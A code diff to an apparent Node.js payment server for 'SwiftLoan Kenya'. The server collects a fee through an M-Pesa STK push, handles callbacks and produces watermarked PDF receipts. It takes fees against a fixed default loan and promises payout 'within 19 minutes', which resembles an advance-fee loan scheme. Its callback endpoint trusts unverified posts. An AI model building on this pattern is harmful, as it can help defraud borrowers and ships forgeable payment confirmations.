@@ -4,7 +4,7 @@ const cors = require("cors");
 const axios = require("axios");
 const fs = require("fs");
 const path = require("path");
-const PDFDocument = require("pdfkit"); // ✅ Keep this one only
+const PDFDocument = require("pdfkit");
 
 const app = express();
 const PORT = 3000;
@@ -74,6 +74,7 @@ app.post("/pay", async (req, res) => {
     console.log("SwiftWallet response:", resp.data);
 
     if (resp.data.success) {
+      // Save PENDING receipt
       const receiptData = {
         reference,
         transaction_id: resp.data.transaction_id || null,
@@ -81,6 +82,7 @@ app.post("/pay", async (req, res) => {
         amount: Math.round(amount),
         loan_amount: loan_amount || "50000",
         phone: formattedPhone,
+        customer_name: "N/A",
         status: "pending",
         status_note: `STK push sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete payment.`,
         timestamp: new Date().toISOString()
@@ -97,6 +99,7 @@ app.post("/pay", async (req, res) => {
         receipt: receiptData
       });
     } else {
+      // Handle failed STK push
       const failedReceiptData = {
         reference,
         transaction_id: resp.data.transaction_id || null,
@@ -104,6 +107,7 @@ app.post("/pay", async (req, res) => {
         amount: Math.round(amount),
         loan_amount: loan_amount || "50000",
         phone: formattedPhone,
+        customer_name: "N/A",
         status: "stk_failed",
         status_note: "STK push failed to send. Please try again or contact support.",
         timestamp: new Date().toISOString()
@@ -137,6 +141,7 @@ app.post("/pay", async (req, res) => {
       amount: amount ? Math.round(amount) : null,
       loan_amount: loan_amount || "50000",
       phone: formattedPhone,
+      customer_name: "N/A",
       status: "error",
       status_note: "System error occurred. Please try again later.",
       timestamp: new Date().toISOString()
@@ -154,7 +159,7 @@ app.post("/pay", async (req, res) => {
   }
 });
 
-  // 2️⃣ Callback handler
+// 2️⃣ Callback handler
 app.post("/callback", (req, res) => {
   console.log("Callback received:", req.body);
 
@@ -163,15 +168,15 @@ app.post("/callback", (req, res) => {
   let receipts = readReceipts();
   const existingReceipt = receipts[ref] || {};
 
-  // Normalize status
   const status = data.status?.toLowerCase();
   const resultCode = data.result?.ResultCode;
 
-  // Try to build customer name from result
-  const customerName = data.result?.Name 
-    || [data.result?.FirstName, data.result?.MiddleName, data.result?.LastName].filter(Boolean).join(" ")
-    || existingReceipt.customer_name
-    || "N/A";
+  // Capture customer name
+  const customerName =
+    data.result?.Name ||
+    [data.result?.FirstName, data.result?.MiddleName, data.result?.LastName].filter(Boolean).join(" ") ||
+    existingReceipt.customer_name ||
+    "N/A";
 
   if ((status === "completed" && data.success === true) || resultCode === 0) {
     receipts[ref] = {
@@ -181,9 +186,9 @@ app.post("/callback", (req, res) => {
       amount: data.result?.Amount || existingReceipt.amount || null,
       loan_amount: existingReceipt.loan_amount || "50000",
       phone: data.result?.Phone || existingReceipt.phone || null,
-      customer_name: customerName,   // ✅ store name
+      customer_name: customerName,
       status: "success",
-      status_note: `Loan withdrawal is successful and the fee was accepted. You will receive the applied loan amount in the next 19 minutes.\n\nRegards Swift Loan Kenya 🇰🇪`,
+      status_note: `Loan withdrawal successful. You will receive your loan within 19 minutes.`,
       timestamp: data.timestamp || new Date().toISOString(),
     };
   } else {
@@ -194,16 +199,15 @@ app.post("/callback", (req, res) => {
       amount: data.result?.Amount || existingReceipt.amount || null,
       loan_amount: existingReceipt.loan_amount || "50000",
       phone: data.result?.Phone || existingReceipt.phone || null,
-      customer_name: customerName,   // ✅ keep name even in failed/cancelled
+      customer_name: customerName,
       status: "cancelled",
-      status_note: data.result?.ResultDesc || "Payment was cancelled or failed. Your loan will remain on hold (expire) for 24 hours and will not be withdrawn. Retry or contact customer care for assistance.",
+      status_note: data.result?.ResultDesc || "Payment failed or was cancelled.",
       timestamp: data.timestamp || new Date().toISOString(),
     };
   }
 
   writeReceipts(receipts);
 
-  // Must always return 200
   res.json({ ResultCode: 0, ResultDesc: "Success" });
 });
 
@@ -219,7 +223,7 @@ app.get("/receipt/:reference", (req, res) => {
   res.json({ success: true, receipt });
 });
 
-// 4️⃣ PDF receipt
+// 4️⃣ PDF receipt (always available)
 app.get("/receipt/:reference/pdf", (req, res) => {
   const receipts = readReceipts();
   const receipt = receipts[req.params.reference];
@@ -228,18 +232,10 @@ app.get("/receipt/:reference/pdf", (req, res) => {
     return res.status(404).json({ success: false, error: "Receipt not found" });
   }
 
-  if (receipt.status !== "success") {
-    return res.status(400).json({
-      success: false,
-      error: "PDF receipt only available after successful payment"
-    });
-  }
-
   generateReceiptPDF(receipt, res);
 });
 
 // ✅ PDF generator
-   
 function generateReceiptPDF(receipt, res) {
   res.setHeader("Content-Type", "application/pdf");
   res.setHeader("Content-Disposition", `attachment; filename=receipt-${receipt.reference}.pdf`);
@@ -247,42 +243,51 @@ function generateReceiptPDF(receipt, res) {
   const doc = new PDFDocument({ margin: 50 });
   doc.pipe(res);
 
-  // 🎨 Header background
-  doc
-    .rect(0, 0, doc.page.width, 80)
-    .fill("#2196F3");
+  // Pick header + watermark by status
+  let headerColor = "#2196F3";
+  let watermarkText = "";
+  let watermarkColor = "green";
 
-  // ⚡ Flash logo (emoji as logo)
-  doc
-    .fillColor("yellow")
-    .fontSize(40)
-    .text("⚡", 20, 20, { align: "left" });
+  if (receipt.status === "success") {
+    headerColor = "#2196F3";
+    watermarkText = "PAID";
+    watermarkColor = "green";
+  } else if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
+    headerColor = "#f44336";
+    watermarkText = "FAILED";
+    watermarkColor = "red";
+  } else if (receipt.status === "pending") {
+    headerColor = "#ff9800";
+    watermarkText = "PENDING";
+    watermarkColor = "gray";
+  }
 
-  // Company name
+  // Header
+  doc.rect(0, 0, doc.page.width, 80).fill(headerColor);
   doc
     .fillColor("white")
     .fontSize(24)
-    .text("SwiftLoan Kenya", 70, 25, { align: "left" })
+    .text("⚡ SwiftLoan Kenya", 50, 25, { align: "left" })
     .fontSize(12)
-    .text("Loan & Payment Receipt", 70, 55);
+    .text("Loan & Payment Receipt", 50, 55);
 
   doc.moveDown(3);
 
-  // 🧾 Receipt details
+  // Receipt details
   doc.fillColor("black").fontSize(14).text("Receipt Details", { underline: true });
   doc.moveDown();
 
   const details = [
-  ["Reference", receipt.reference],
-  ["Transaction ID", receipt.transaction_id || "N/A"],
-  ["Transaction Code", receipt.transaction_code || "N/A"],
-  ["Fee Amount", `KSH ${receipt.amount}`],
-  ["Loan Amount", `KSH ${receipt.loan_amount}`],
-  ["Phone", receipt.phone],
-  ["Customer Name", receipt.customer_name || "N/A"],   // ✅ new line
-  ["Status", receipt.status.toUpperCase()],
-  ["Time", new Date(receipt.timestamp).toLocaleString()],
-];
+    ["Reference", receipt.reference],
+    ["Transaction ID", receipt.transaction_id || "N/A"],
+    ["Transaction Code", receipt.transaction_code || "N/A"],
+    ["Fee Amount", `KSH ${receipt.amount}`],
+    ["Loan Amount", `KSH ${receipt.loan_amount}`],
+    ["Phone", receipt.phone],
+    ["Customer Name", receipt.customer_name || "N/A"],
+    ["Status", receipt.status.toUpperCase()],
+    ["Time", new Date(receipt.timestamp).toLocaleString()],
+  ];
 
   details.forEach(([key, value]) => {
     doc.fontSize(12).text(`${key}: `, { continued: true }).text(value);
@@ -290,37 +295,29 @@ function generateReceiptPDF(receipt, res) {
 
   doc.moveDown();
 
-  // 📝 Status note
   if (receipt.status_note) {
-    doc
-      .fontSize(12)
-      .fillColor("#555")
-      .text("Note:", { underline: true })
-      .moveDown(0.5)
-      .text(receipt.status_note);
+    doc.fontSize(12).fillColor("#555").text("Note:", { underline: true }).moveDown(0.5).text(receipt.status_note);
   }
 
-  // ✅ Watermark for success
-  if (receipt.status === "success") {
+  // Watermark
+  if (watermarkText) {
     doc
       .fontSize(60)
-      .fillColor("green")
+      .fillColor(watermarkColor)
       .opacity(0.2)
       .rotate(-30, { origin: [300, 400] })
-      .text("PAID", 150, 400, { align: "center" })
+      .text(watermarkText, 150, 400, { align: "center" })
       .rotate(30, { origin: [300, 400] })
       .opacity(1);
   }
 
   // Footer
   doc.moveDown(2);
-  doc
-    .fontSize(10)
-    .fillColor("gray")
-    .text("⚡ SwiftLoan Kenya © 2024", { align: "center" });
+  doc.fontSize(10).fillColor("gray").text("⚡ SwiftLoan Kenya © 2024", { align: "center" });
 
   doc.end();
 }
+
 // 5️⃣ Start server
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
